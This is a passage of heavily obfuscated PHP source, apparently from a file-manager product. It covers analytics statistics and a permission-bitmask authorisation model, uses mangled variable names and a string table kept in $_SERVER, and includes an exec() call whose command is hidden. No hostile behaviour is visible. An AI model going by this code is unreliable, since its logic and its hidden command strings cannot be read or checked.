$°›¼·æÊ[1919] ? $°›¼·æÊ[1914] : $°›¼·æÊ[1915]; $úÎÕ¬¤[$°›¼·æÊ[1847]] = $°›¼·æÊ[12]; $úÎÕ¬¤[$°›¼·æÊ[853]] = $½ğå³ÑĞ; $úÎÕ¬¤[$°›¼·æÊ[1911]] = $°›¼·æÊ[400]; $this->update(); } public function nameParse($‚ÃíšûŞ) { $‘×ÕîÆÓ =& $_SERVER[‹‰”››ê]; $Øêš“‚ =& $this->task; if ($Øêš“‚[$‘×ÕîÆÓ[1792]] < $Øêš“‚[$‘×ÕîÆÓ[1156]]) { $¦¿ÏÙæÇ = get_path_this($‚ÃíšûŞ); if (strstr($¦¿ÏÙæÇ, $‘×ÕîÆÓ[10])) { $Øêš“‚[$‘×ÕîÆÓ[1792]] += 1; } } if ($Øêš“‚[$‘×ÕîÆÓ[1911]] == $‘×ÕîÆÓ[1295]) { $Øêš“‚[$‘×ÕîÆÓ[1911]] = $‘×ÕîÆÓ[400]; } $Øêš“‚[$‘×ÕîÆÓ[1843]] = $‚ÃíšûŞ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ÒÕë¿) { $©·’åŒİ =& $_SERVER[‹‰”››ê]; $€û‰ÑæÅ = array($©·’åŒİ[679] => array($©·’åŒİ[33] => $©·’åŒİ[1920], $©·’åŒİ[362] => array($©·’åŒİ[285], $©·’åŒİ[855], $©·’åŒİ[1921], $©·’åŒİ[1922])), $©·’åŒİ[1923] => array($©·’åŒİ[33] => $©·’åŒİ[1924], $©·’åŒİ[362] => array($©·’åŒİ[285], $©·’åŒİ[853], $©·’åŒİ[1925], $©·’åŒİ[1926], $©·’åŒİ[1927]))); if (!isset($€û‰ÑæÅ[$ÒÕë¿])) { return !1; } $this->optionType = $€û‰ÑæÅ[$ÒÕë¿][$©·’åŒİ[33]]; $this->field = $€û‰ÑæÅ[$ÒÕë¿][$©·’åŒİ[362]]; return !0; } public function listData($¨ë¾ë“ = false, $œ¦©³Àñ = "\155\x6f\x64\151\x66\171\124\151\x6d\145", $Ã¹¹ÑÕ³ = false) { return parent::listData($¨ë¾ë“, $œ¦©³Àñ, $Ã¹¹ÑÕ³); } public function trendList($ßŠÉÆÆ¢) { $•©¨€Ûƒ =& $_SERVER[‹‰”››ê]; $ÍûÊ‰ŒŒ = $this->listData(); if ($ÍûÊ‰ŒŒ) { $Ç™³¦Ôø = end($ÍûÊ‰ŒŒ); $³ë½Ğß» = date($•©¨€Ûƒ[1928], strtotime($•©¨€Ûƒ[1929])); if ($Ç™³¦Ôø[$•©¨€Ûƒ[285]] == $³ë½Ğß») { return $ÍûÊ‰ŒŒ; } $İ¿åôÊÕ = strtotime($Ç™³¦Ôø[$•©¨€Ûƒ[285]]); } if (!isset($İ¿åôÊÕ)) { $›€ÆØ»‚ = $ßŠÉÆÆ¢ == $•©¨€Ûƒ[679] ? $•©¨€Ûƒ[611] : $•©¨€Ûƒ[920]; $İ¿åôÊÕ = Model($›€ÆØ»‚)->min($•©¨€Ûƒ[234]); } $ÂÑ³Œ¸ = $•©¨€Ûƒ[1930] . ucfirst($ßŠÉÆÆ¢); $™²–Æ®Ì = $this->dateList($İ¿åôÊÕ); foreach ($™²–Æ®Ì as $³ë½Ğß») { $this->{$ÂÑ³Œ¸}($³ë½Ğß»); } return $this->listData(); } private function dateList($æ…·èÏş) { $Ö¾Í‹Ê” =& $_SERVER[‹‰”››ê]; $Õ£¯À…” = $æ…·èÏş; $³Â¡§Ñé = strtotime($Ö¾Í‹Ê”[1929]); $á±üïß = array(); while ($Õ£¯À…” <= $³Â¡§Ñé) { $á±üïß[] = date($Ö¾Í‹Ê”[1928], $Õ£¯À…”); $Õ£¯À…” = strtotime($Ö¾Í‹Ê”[1931], $Õ£¯À…”); } return $á±üïß; } public function _recordUser($ØŠùÎ¢Ñ = '') { $Íª€ÍØ  =& $_SERVER[‹‰”››ê]; $Ùø–›†© = strtotime(date($Íª€ÍØ [1932], strtotime($ØŠùÎ¢Ñ))); $£àÛÈ‚ò = strtotime(date($Íª€ÍØ [1933], strtotime($ØŠùÎ¢Ñ))); $öáº£ş§ = array($Íª€ÍØ [234] => array($Íª€ÍØ [1106], $£àÛÈ‚ò)); $í‚ÛÌ¯ß = Model($Íª€ÍØ [611])->where($öáº£ş§)->count($Íª€ÍØ [1791]); $öáº£ş§[$Íª€ÍØ [234]] = array($Íª€ÍØ [420], array($Ùø–›†©, $£àÛÈ‚ò)); $ïë›Í‘Ã = Model($Íª€ÍØ [611])->where($öáº£ş§)->count($Íª€ÍØ [1791]); $öáº£ş§[$Íª€ÍØ [33]] = $Íª€ÍØ [1934]; $Ü„„› = Model($Íª€ÍØ [1935])->where($öáº£ş§)->count($Íª€ÍØ [1936]); $¯§±¶ĞĞ = array($Íª€ÍØ [285] => $ØŠùÎ¢Ñ, $Íª€ÍØ [855] => (int) $í‚ÛÌ¯ß, $Íª€ÍØ [1921] => (int) $ïë›Í‘Ã, $Íª€ÍØ [1922] => (int) $Ü„„›); return $this->insert($¯§±¶ĞĞ); } public function _recordStore($™Çµ‚¤ = '') { $Ô¢®¦¿‡ =& $_SERVER[‹‰”››ê]; $€—Áü›× = strtotime(date($Ô¢®¦¿‡[1933], strtotime($™Çµ‚¤))); $˜±âŒŸ™ = array($Ô¢®¦¿‡[234] => array($Ô¢®¦¿‡[1106], $€—Áü›×)); $æÓËı™Ì = Model($Ô¢®¦¿‡[558])->where($˜±âŒŸ™)->sum($Ô¢®¦¿‡[79]); $˜±âŒŸ™[$Ô¢®¦¿‡[497]] = 0; $ŞÈûæÒÄ = Model($Ô¢®¦¿‡[920])->where($˜±âŒŸ™)->sum($Ô¢®¦¿‡[79]); $˜±âŒŸ™[$Ô¢®¦¿‡[191]] = 1; $º ²¿Ë = Model($Ô¢®¦¿‡[920])->where($˜±âŒŸ™)->sum($Ô¢®¦¿‡[79]); $˜±âŒŸ™[$Ô¢®¦¿‡[191]] = 2; $Î÷şĞÍŞ = Model($Ô¢®¦¿‡[920])->where($˜±âŒŸ™)->sum($Ô¢®¦¿‡[79]); $ß„È›Îì = array($Ô¢®¦¿‡[285] => $™Çµ‚¤, $Ô¢®¦¿‡[853] => (int) $ŞÈûæÒÄ, $Ô¢®¦¿‡[1925] => (int) $æÓËı™Ì, $Ô¢®¦¿‡[1926] => (int) $º ²¿Ë, $Ô¢®¦¿‡[1927] => (int) $Î÷şĞÍŞ); return $this->insert($ß„È›Îì); } public function trend($‡ÀôÙ‘Â, $ù‚œ©ûå) { $Ö®âŒ˜ =& $_SERVER[‹‰”››ê]; if (!$this->init($‡ÀôÙ‘Â)) { return !1; } $ÏäÍ¬“ó = $this->trendList($‡ÀôÙ‘Â); if ($ÏäÍ¬“ó && $ù‚œ©ûå != $Ö®âŒ˜[1763]) { $®ØÉºÍ• = $ÏäÍ¬“ó[0][$Ö®âŒ˜[285]]; $™¡‰Ñá = $this->validDate($ù‚œ©ûå, $®ØÉºÍ•); $ÇÎ‰·ÙÚ = array(); $òïıŞŞ² = array_to_keyvalue($ÏäÍ¬“ó, $Ö®âŒ˜[285]); foreach ($™¡‰Ñá as $îÓÚÕà–) { if (isset($òïıŞŞ²[$îÓÚÕà–])) { $äŸ£ìò = $òïıŞŞ²[$îÓÚÕà–]; } else { $äŸ£ìò = end($ÏäÍ¬“ó); $äŸ£ìò[$Ö®âŒ˜[285]] = $îÓÚÕà–; if ($‡ÀôÙ‘Â == $Ö®âŒ˜[679]) { $äŸ£ìò[$Ö®âŒ˜[1921]] = $äŸ£ìò[$Ö®âŒ˜[1922]] = 0; } } $ÇÎ‰·ÙÚ[] = $äŸ£ìò; } $ÏäÍ¬“ó = $ÇÎ‰·ÙÚ; } $šÚæñˆ¤ = array($Ö®âŒ˜[679] => array($Ö®âŒ˜[855] => LNG($Ö®âŒ˜[1937]), $Ö®âŒ˜[1921] => LNG($Ö®âŒ˜[1938]), $Ö®âŒ˜[1922] => LNG($Ö®âŒ˜[1939])), $Ö®âŒ˜[1923] => array($Ö®âŒ˜[853] => LNG($Ö®âŒ˜[1940]), $Ö®âŒ˜[1925] => LNG($Ö®âŒ˜[1941]), $Ö®âŒ˜[1926] => LNG($Ö®âŒ˜[1942]), $Ö®âŒ˜[1927] => LNG($Ö®âŒ˜[1943]))); $€à‚Úö– = array($Ö®âŒ˜[679] => $Ö®âŒ˜[1944], $Ö®âŒ˜[1923] => $Ö®âŒ˜[79]); if (empty($ÏäÍ¬“ó)) { $îÓÚÕà– = date($Ö®âŒ˜[1928], strtotime($Ö®âŒ˜[1929])); $ïõØ©œ» = array($Ö®âŒ˜[285] => $îÓÚÕà–); foreach ($šÚæñˆ¤[$‡ÀôÙ‘Â] as $¬×¶¯™¶ => $€•—ì¸ƒ) { $ïõØ©œ»[$¬×¶¯™¶] = 0; } $ÏäÍ¬“ó[] = $ïõØ©œ»; } $ÖŒ é¿ = array(); foreach ($ÏäÍ¬“ó as $€•—ì¸ƒ) { if ($‡ÀôÙ‘Â == $Ö®âŒ˜[1923] && $€•—ì¸ƒ[$Ö®âŒ˜[1925]] > $€•—ì¸ƒ[$Ö®âŒ˜[853]]) { $€•—ì¸ƒ[$Ö®âŒ˜[1925]] = $€•—ì¸ƒ[$Ö®âŒ˜[853]]; } foreach ($šÚæñˆ¤[$‡ÀôÙ‘Â] as $¬×¶¯™¶ => $ìªÂ¹˜õ) { $äŸ£ìò = array($Ö®âŒ˜[285] => $€•—ì¸ƒ[$Ö®âŒ˜[285]], $Ö®âŒ˜[1677] => $ìªÂ¹˜õ); $äŸ£ìò[$€à‚Úö–[$‡ÀôÙ‘Â]] = isset($€•—ì¸ƒ[$¬×¶¯™¶]) ? $€•—ì¸ƒ[$¬×¶¯™¶] : 0; $ÖŒ é¿[] = $äŸ£ìò; } } return $ÖŒ é¿; } public function validDate($†¸éƒŸ, $°¸ü£ÍÅ) { $˜ÕÕÜ¿ =& $_SERVER[‹‰”››ê]; $šì”›¢½ = date($˜ÕÕÜ¿[1928], strtotime($˜ÕÕÜ¿[1929])); $ÖØéÊ’ = array($šì”›¢½); switch ($†¸éƒŸ) { case $˜ÕÕÜ¿[1770]: $™ò¦¨º = mktime(0, 0, 0, date($˜ÕÕÜ¿[1945]), date($˜ÕÕÜ¿[1469]) - date($˜ÕÕÜ¿[1558]) + 7 - 7, date($˜ÕÕÜ¿[1946])); $Ğ®òéÊ = 0; do { $àø§Äï© = date($˜ÕÕÜ¿[1928], $™ò¦¨º - 3600 * 24 * 7 * $Ğ®òéÊ); $ÖØéÊ’[] = $àø§Äï©; $Ğ®òéÊ++; } while ($°¸ü£ÍÅ < $àø§Äï©); break; case $˜ÕÕÜ¿[1768]: $Ğ®òéÊ = 1; do { $ãáò¶˜„ = date($˜ÕÕÜ¿[1947], strtotime("\x2d\40{$Ğ®òéÊ}\40\x6d\x6f\x6e\x74\x68\x73")); $ÖØéÊ’[] = $ãáò¶˜„; $Ğ®òéÊ++; } while ($°¸ü£ÍÅ < $ãáò¶˜„); break; case $˜ÕÕÜ¿[1948]: $”áãÁú¼ = (int) date($˜ÕÕÜ¿[1946], strtotime($°¸ü£ÍÅ)); $üƒÒØ± = (int) date($˜ÕÕÜ¿[1946]); if ($”áãÁú¼ >= $üƒÒØ±) { break; } for ($”áãÁú¼; $”áãÁú¼ < $üƒÒØ±; $”áãÁú¼++) { $ÖØéÊ’[] = $”áãÁú¼ . $˜ÕÕÜ¿[1949]; } break; default: break; } if ($°¸ü£ÍÅ > end($ÖØéÊ’)) { array_pop($ÖØéÊ’); } sort($ÖØéÊ’); return $ÖØéÊ’; } public function listTable($ÔüÎŒøó) { $à‘‰Àµ = ucfirst($ÔüÎŒøó); return Model($à‘‰Àµ)->listData(); } public function option($‡‹·«û) { $³‡ñşªá = $_SERVER[‹‰”››ê][1950] . ucfirst($‡‹·«û); return $this->{$³‡ñşªá}(); } private function optionUser() { $Ã«¬ˆ¬ =& $_SERVER[‹‰”››ê]; $º¤ÁÚµé = Model($Ã«¬ˆ¬[611])->count($Ã«¬ˆ¬[1791]); $ï¥Š³ı = Model($Ã«¬ˆ¬[611])->where($Ã«¬ˆ¬[1951])->count($Ã«¬ˆ¬[1791]); $÷œÑ³÷¡ = intval($GLOBALS[$Ã«¬ˆ¬[6]][$Ã«¬ˆ¬[436]][$Ã«¬ˆ¬[1736]]) / 3600; $Ê§õ±Œ = strtotime("\x2d{$÷œÑ³÷¡}\40\x68\157\x75\x72\163"); $¤úÂü— = strtotime(date($Ã«¬ˆ¬[1932])); if ($Ê§õ±Œ < $¤úÂü—) { $Ê§õ±Œ = $¤úÂü—; } $ûí…»Æè = array($Ã«¬ˆ¬[1952] => array($Ã«¬ˆ¬[1107], $Ê§õ±Œ)); $÷ÜÏíõË = (int) Model($Ã«¬ˆ¬[611])->where($ûí…»Æè)->count($Ã«¬ˆ¬[1791]); if (!$÷ÜÏíõË) { $÷ÜÏíõË = 1; } $ûí…»Æè = array($Ã«¬ˆ¬[1952] => array($Ã«¬ˆ¬[1107], $¤úÂü—)); $ô’¤ñ¬ = Model($Ã«¬ˆ¬[611])->where($ûí…»Æè)->count($Ã«¬ˆ¬[1791]); return array($Ã«¬ˆ¬[848] => (int) $º¤ÁÚµé, $Ã«¬ˆ¬[1953] => (int) ($º¤ÁÚµé - $ï¥Š³ı), $Ã«¬ˆ¬[1954] => (int) $ï¥Š³ı, $Ã«¬ˆ¬[1955] => (int) $ô’¤ñ¬, $Ã«¬ˆ¬[1956] => $÷ÜÏíõË); } private function optionFile() { $Ö×‰È° =& $_SERVER[‹‰”››ê]; $ÂˆêØìç = $this->sourceSize(); $âæú†Î• = $ÂˆêØìç[$Ö×‰È°[79]]; $ú—¤ùá¯ = $ÂˆêØìç[$Ö×‰È°[1925]]; $Œäµ£ºÄ = Model($Ö×‰È°[920])->where(array($Ö×‰È°[497] => 0))->count($Ö×‰È°[194]); $ë˜¨…ü = array($Ö×‰È°[497] => 0, $Ö×‰È°[234] => array($Ö×‰È°[1107], strtotime(date($Ö×‰È°[1932])))); $ÏÊÚâÚâ = Model($Ö×‰È°[920])->where($ë˜¨…ü)->sum($Ö×‰È°[79]); $Œ„Óœõ = Model($Ö×‰È°[920])->where($ë˜¨…ü)->count($Ö×‰È°[194]); return array($Ö×‰È°[853] => $âæú†Î•, $Ö×‰È°[1925] => $ú—¤ùá¯, $Ö×‰È°[1957] => $âæú†Î• - $ú—¤ùá¯, $Ö×‰È°[1958] => (int) $ÏÊÚâÚâ, $Ö×‰È°[855] => (int) $Œäµ£ºÄ, $Ö×‰È°[1959] => (int) $Œ„Óœõ); } private function optionAccess() { $ÊãÀ—ß¬ =& $_SERVER[‹‰”››ê]; return array($ÊãÀ—ß¬[848] => $this->typeLogCnt(), $ÊãÀ—ß¬[110] => $this->typeLogCnt($ÊãÀ—ß¬[110]), $ÊãÀ—ß¬[537] => $this->typeLogCnt($ÊãÀ—ß¬[537]), $ÊãÀ—ß¬[1960] => $this->typeLogCnt($ÊãÀ—ß¬[1960]), $ÊãÀ—ß¬[1961] => $this->typeLogCnt($ÊãÀ—ß¬[1961]), $ÊãÀ—ß¬[679] => $this->typeLogCnt($ÊãÀ—ß¬[12], $ÊãÀ—ß¬[1936])); } private function typeLogCnt($˜š¸î‰¤ = '', $×‚Ë¶İ… = "\151\x64") { $ ˆÒÁ =& $_SERVER[‹‰”››ê]; $ ÍöŠ±“ = array($ ˆÒÁ[110] => array($ ˆÒÁ[1962], $ ˆÒÁ[1963]), $ ˆÒÁ[537] => array($ ˆÒÁ[1964], $ ˆÒÁ[1965]), $ ˆÒÁ[1960] => array($ ˆÒÁ[1966], $ ˆÒÁ[1967], $ ˆÒÁ[1968]), $ ˆÒÁ[1961] => array($ ˆÒÁ[1969], $ ˆÒÁ[1970]), $ ˆÒÁ[1971] => array($ ˆÒÁ[1972], $ ˆÒÁ[1973], $ ˆÒÁ[1974])); $»†ûñ·Ö = strtotime(date($ ˆÒÁ[1932])); $›¶Øğ‘Õ = array($ ˆÒÁ[234] => array($ ˆÒÁ[1107], $»†ûñ·Ö)); if ($˜š¸î‰¤) { $›¶Øğ‘Õ[$ ˆÒÁ[33]] = array($ ˆÒÁ[7], $ ÍöŠ±“[$˜š¸î‰¤]); } $Üº†ãê = Model($ ˆÒÁ[1935])->where($›¶Øğ‘Õ)->count($×‚Ë¶İ…); return (int) $Üº†ãê; } private function optionServer() { $êë‡¹Â =& $_SERVER[‹‰”››ê]; $ŒôúöŠ« = $this->diskDriver(); $ùù«¶×à = KodIO::defaultDriver(); $ü¶Àƒê¸ = array($êë‡¹Â[913] => $ùù«¶×à[$êë‡¹Â[487]]); $¡‘·ğ = Model($êë‡¹Â[558])->where($ü¶Àƒê¸)->sum($êë‡¹Â[79]); $¦Â»€’ = explode($êë‡¹Â[53], $_SERVER[$êë‡¹Â[147]]); $§”Åß™ò = $¦Â»€’[0]; $„¥¿¤×ë = $GLOBALS[$êë‡¹Â[6]][$êë‡¹Â[21]]; $ı »ï = $„¥¿¤×ë[$êë‡¹Â[1069]]; if ($ı »ï == $êë‡¹Â[1057]) { $é™íêæ³ = explode($êë‡¹Â[1384], $„¥¿¤×ë[$êë‡¹Â[1068]]); $ı »ï = $é™íêæ³[0]; } if ($ı »ï == $êë‡¹Â[1005] || $ı »ï == $êë‡¹Â[898]) { $°©“ËÆå = Model()->db()->query($êë‡¹Â[1975]); $ø†ê¤ = $°©“ËÆå[0] && isset($°©“ËÆå[0][$êë‡¹Â[1676]]) ? $°©“ËÆå[0][$êë‡¹Â[1676]] : 0; $ı »ï = $êë‡¹Â[1976] . ($ø†ê¤ ? $êë‡¹Â[8] . $ø†ê¤ : $êë‡¹Â[12]); } $È˜ù•º = $GLOBALS[$êë‡¹Â[6]][$êë‡¹Â[436]][$êë‡¹Â[922]]; return array($êë‡¹Â[1977] => $ŒôúöŠ« ? $ŒôúöŠ«[$êë‡¹Â[1978]] : 0, $êë‡¹Â[1979] => $ŒôúöŠ« ? $ŒôúöŠ«[$êë‡¹Â[1980]] : 0, $êë‡¹Â[1981] => (int) $ùù«¶×à[$êë‡¹Â[1978]] * 1024 * 1024 * 1024, $êë‡¹Â[1982] => (int) $¡‘·ğ, $êë‡¹Â[1983] => ucfirst($§”Åß™ò), $êë‡¹Â[1984] => $êë‡¹Â[1985] . PHP_VERSION, $êë‡¹Â[1986] => phpBuild64() ? 64 : 32, $êë‡¹Â[847] => str_replace($êë‡¹Â[1225], $êë‡¹Â[1085], $ı »ï), $êë‡¹Â[436] => ucfirst($È˜ù•º), $êë‡¹Â[32] => $_SERVER[$êë‡¹Â[1987]]); } private function diskDriver() { $úÖ´†íš =& $_SERVER[‹‰”››ê]; $Á½øôóƒ = $úÖ´†íš[8]; $çéÑ«§ = $GLOBALS[$úÖ´†íš[6]][$úÖ´†íš[1401]] == $úÖ´†íš[1402]; if ($çéÑ«§) { $Á½øôóƒ = $úÖ´†íš[1988]; if (function_exists($úÖ´†íš[1989])) { exec($úÖ´†íš[1990], $Ó‰ÅÒ”); $Á½øôóƒ = $Ó‰ÅÒ”[1] . $úÖ´†íš[8]; } } if (!file_exists($Á½øôóƒ)) { return; } if (!function_exists($úÖ´†íš[1991])) { return; } $éıÜÏÖÎ = @disk_total_space($Á½øôóƒ); $˜Îò¸ïŒ = $éıÜÏÖÎ - @disk_free_space($Á½øôóƒ); return array($úÖ´†íš[1978] => $éıÜÏÖÎ, $úÖ´†íš[1980] => $˜Îò¸ïŒ); } public function fileChart($„ŸÒ°…) { $Ü’¼‘¾À =& $_SERVER[‹‰”››ê]; if (isset($„ŸÒ°…[$Ü’¼‘¾À[1791]])) { return Model($Ü’¼‘¾À[920])->userFileTypeProfile($„ŸÒ°…[$Ü’¼‘¾À[1791]]); } if (isset($„ŸÒ°…[$Ü’¼‘¾À[1992]])) { return Model($Ü’¼‘¾À[920])->groupFileTypeProfile($„ŸÒ°…[$Ü’¼‘¾À[1992]]); } $è¬÷œÙó = $this->sourceSize(); $›ÔÈ‰³ = array($Ü’¼‘¾À[193] => 0, $Ü’¼‘¾À[191] => 1); $¯·¯‹«³ = Model($Ü’¼‘¾À[920])->where($›ÔÈ‰³)->sum($Ü’¼‘¾À[79]); $›ÔÈ‰³[$Ü’¼‘¾À[191]] = 2; $‡­·×Ğ“ = Model($Ü’¼‘¾À[920])->where($›ÔÈ‰³)->sum($Ü’¼‘¾À[79]); return array($Ü’¼‘¾À[853] => $è¬÷œÙó[$Ü’¼‘¾À[79]], $Ü’¼‘¾À[1925] => $è¬÷œÙó[$Ü’¼‘¾À[1925]], $Ü’¼‘¾À[1926] => (int) $¯·¯‹«³, $Ü’¼‘¾À[1927] => (int) $‡­·×Ğ“); } private function sourceSize() { $¥ú¶Å =& $_SERVER[‹‰”››ê]; $²ğÜªÜâ = Model($¥ú¶Å[920])->where(array($¥ú¶Å[497] => 0))->sum($¥ú¶Å[79]); $†ºÑÜœ = Model($¥ú¶Å[558])->sum($¥ú¶Å[79]); if ($†ºÑÜœ > $²ğÜªÜâ) { $†ºÑÜœ = $²ğÜªÜâ; } return array($¥ú¶Å[79] => (int) $²ğÜªÜâ, $¥ú¶Å[1925] => (int) $†ºÑÜœ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¤’˜ÌÎ =& $_SERVER[‹‰”››ê]; $®ªç¿¾ = array(array($¤’˜ÌÎ[506] => LNG($¤’˜ÌÎ[1993]), $¤’˜ÌÎ[1994] => $¤’˜ÌÎ[1995], $¤’˜ÌÎ[1996] => 1, $¤’˜ÌÎ[1997] => 1, $¤’˜ÌÎ[1998] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¤’˜ÌÎ[506] => LNG($¤’˜ÌÎ[1999]), $¤’˜ÌÎ[1994] => $¤’˜ÌÎ[2000], $¤’˜ÌÎ[1996] => 2, $¤’˜ÌÎ[1997] => 1, $¤’˜ÌÎ[1998] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¤’˜ÌÎ[506] => LNG($¤’˜ÌÎ[2001]), $¤’˜ÌÎ[1994] => $¤’˜ÌÎ[2002], $¤’˜ÌÎ[1996] => 3, $¤’˜ÌÎ[1997] => 1, $¤’˜ÌÎ[1998] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¤’˜ÌÎ[506] => LNG($¤’˜ÌÎ[2003]), $¤’˜ÌÎ[1994] => $¤’˜ÌÎ[2004], $¤’˜ÌÎ[1996] => 4, $¤’˜ÌÎ[1997] => 1, $¤’˜ÌÎ[1998] => self::AUTH_SHOW | self::AUTH_VIEW), array($¤’˜ÌÎ[506] => LNG($¤’˜ÌÎ[2005]), $¤’˜ÌÎ[1994] => $¤’˜ÌÎ[2006], $¤’˜ÌÎ[1996] => 5, $¤’˜ÌÎ[1997] => 1, $¤’˜ÌÎ[1998] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¤’˜ÌÎ[506] => LNG($¤’˜ÌÎ[2007]), $¤’˜ÌÎ[1994] => $¤’˜ÌÎ[2008], $¤’˜ÌÎ[1996] => 6, $¤’˜ÌÎ[1997] => 1, $¤’˜ÌÎ[1998] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¤’˜ÌÎ[506] => LNG($¤’˜ÌÎ[2009]), $¤’˜ÌÎ[1994] => $¤’˜ÌÎ[2010], $¤’˜ÌÎ[1996] => 7, $¤’˜ÌÎ[1997] => 1, $¤’˜ÌÎ[1998] => 0)); return $®ªç¿¾; } public static function authCheck($Ó‰¿·š, $ö‡ÜØËƒ) { $ÚÌåÛ§Ã =& $_SERVER[‹‰”››ê]; $Ó‰¿·š = intval($Ó‰¿·š); if (KodUser::isRoot() && $GLOBALS[$ÚÌåÛ§Ã[6]][$ÚÌåÛ§Ã[2011]]) { return !0; } if ($Ó‰¿·š <= 0) { return !1; } if (($Ó‰¿·š & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ó‰¿·š & $ö‡ÜØËƒ); } public static function authCheckShow($‹å¯½¢„) { return self::authCheck($‹å¯½¢„, self::AUTH_SHOW); } public static function authCheckView($•ª®÷¤ƒ) { return self::authCheck($•ª®÷¤ƒ, self::AUTH_VIEW); } public static function authCheckDownload($á”µâ«Ş) { return self::authCheck($á”µâ«Ş, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÔÎÈÀ“·) { return self::authCheck($ÔÎÈÀ“·, self::AUTH_UPLOAD); } public static function authCheckEdit($Ø½ÛÏé) { return self::authCheck($Ø½ÛÏé, self::AUTH_EDIT); } public static function authCheckRemove($ÈŸÖŠ») { return self::authCheck($ÈŸÖŠ», self::AUTH_REMOVE); } public static function authCheckShare($èÊ­—Ú) { return self::authCheck($èÊ­—Ú, self::AUTH_SHARE); } public static function authCheckComment($ÙÌ‰ëªİ) { return self::authCheck($ÙÌ‰ëªİ, self::AUTH_COMMENT); } public static function authCheckEvent($¡Í²àå«) { return self::authCheck($¡Í²àå«, self::AUTH_EVENT); } public static function authCheckRoot($ù××È…ê) { return self::authCheck($ù××È…ê, self::AUTH_ROOT); } public static function authCheckAction($øï…´é½, $½úÈ’ë¯) { $Ó»õÚ…® =& $_SERVER[‹‰”››ê]; $†»¶Ù«¦ = array($Ó»õÚ…®[2012] => self::AUTH_VIEW, $Ó»õÚ…®[1295] => self::AUTH_DOWNLOAD, $Ó»õÚ…®[110] => self::AUTH_UPLOAD, $Ó»õÚ…®[1961] => self::AUTH_EDIT, $Ó»õÚ…®[1960] => self::AUTH_REMOVE, $Ó»õÚ…®[1971] => self::AUTH_SHARE, $Ó»õÚ…®[441] => self::AUTH_COMMENT, $Ó»õÚ…®[1778] => self::AUTH_EVENT, $Ó»õÚ…®[2013] => self::AUTH_ROOT); if (!isset($†»¶Ù«¦[$½úÈ’ë¯])) { return; } $ñå†¾„Ñ = $†»¶Ù«¦[$½úÈ’ë¯]; $øï…´é½ = intval($øï…´é½); if ($øï…´é½ <= 0) { return !1; } if (($øï…´é½ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($øï…´é½ & $ñå†¾„Ñ); } public static function authDisable($‰Ã—ä°, $…¯ìÑÎ‚) { if (intval($‰Ã—ä°) <= 0) { return 0; } return intval($‰Ã—ä°) & ~$…¯ìÑÎ‚; } public $optionType = "\x53\x79\x73\164\145\155\56\x73\157\x75\162\x63\145\x41\165\x74\x68\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x61\x75\x74\150", "\154\x61\142\x65\154", "\144\x69\163\x70\154\x61\171", "\x73\171\163\x74\145\x6d", "\x73\x6f\162\x74"); public function initData() { $ñÓßÉ€ï = $this->authDefault(); foreach ($ñÓßÉ€ï as $ó†Ë´Ë‹) { $this->add($ó†Ë´Ë‹); } } public function findAuth($ƒ‡º¿ºŒ, $’´¢ëÖÉ) { $³¥’ÇÔş =& $_SERVER[‹‰”››ê]; $ìëåÍë‚ = parent::listData(); foreach ($ìëåÍë‚ as $ÄÇšïÄµ) { $¢öé“†Ï = intval($ÄÇšïÄµ[$³¥’ÇÔş[499]]); if ($¢öé“†Ï <= 0 || $ÄÇšïÄµ[$³¥’ÇÔş[2014]] == 0) { continue; } if (($¢öé“†Ï & $ƒ‡º¿ºŒ) != $ƒ‡º¿ºŒ) { continue; } if (($¢öé“†Ï & $’´¢ëÖÉ) != 0) { continue; } return $ÄÇšïÄµ[$³¥’ÇÔş[487]]; } return !1; } public function findAuthMax($–Æññ§¢, $ÓÁ «ÏÕ) { $ë¢«ì£ =& $_SERVER[‹‰”››ê]; $ÌËÊÅñæ = !1; $ÒË‰òÙ¾ = parent::listData(); foreach ($ÒË‰òÙ¾ as $ì”ÄÂúÔ) { $‹ı«¡ªŒ = intval($ì”ÄÂúÔ[$ë¢«ì£[499]]); if ($‹ı«¡ªŒ <= 0 || $ì”ÄÂúÔ[$ë¢«ì£[2014]] == 0) { continue; } if (($‹ı«¡ªŒ & $–Æññ§¢) != $–Æññ§¢) { continue; } if (($‹ı«¡ªŒ & $ÓÁ «ÏÕ) != 0) { continue; } if (!$ÌËÊÅñæ) { $ÌËÊÅñæ = $ì”ÄÂúÔ; continue; } if (intval($ÌËÊÅñæ[$ë¢«ì£[499]]) < $‹ı«¡ªŒ) { $ÌËÊÅñæ = $ì”ÄÂúÔ; } } return $ÌËÊÅñæ ? $ÌËÊÅñæ[$ë¢«ì£[487]] : !1; } public function findAuthReadOnly() { $ò¯³°åŒ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÉªµóÈ’ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return 